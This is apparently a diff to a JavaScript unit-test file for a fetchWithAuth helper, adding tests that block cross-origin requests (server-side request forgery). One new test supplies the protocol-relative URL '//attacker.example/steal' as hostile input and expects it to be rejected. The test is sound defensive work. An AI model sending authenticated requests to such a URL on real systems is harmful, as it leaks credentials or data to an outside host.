@@ -126,9 +126,16 @@ describe("cross-origin URL rejection (CodeQL: server-side request forgery)", () 
     expect(fetchMock).not.toHaveBeenCalled();
   });
 
-  it("fetchWithAuth allows a same-origin absolute URL", async () => {
-    const res = await fetchWithAuth(`${window.location.origin}/api/thing`);
+  it("fetchWithAuth allows a root-relative same-origin path", async () => {
+    const res = await fetchWithAuth("/api/thing");
     expect(res).toEqual({ data: "ok" });
     expect(fetchMock).toHaveBeenCalledTimes(1);
+  });
+
+  it("fetchWithAuth refuses a protocol-relative URL (// is a different host)", async () => {
+    await expect(fetchWithAuth("//attacker.example/steal")).rejects.toThrow(
+      /cross-origin/i,
+    );
+    expect(fetchMock).not.toHaveBeenCalled();
   });
 });
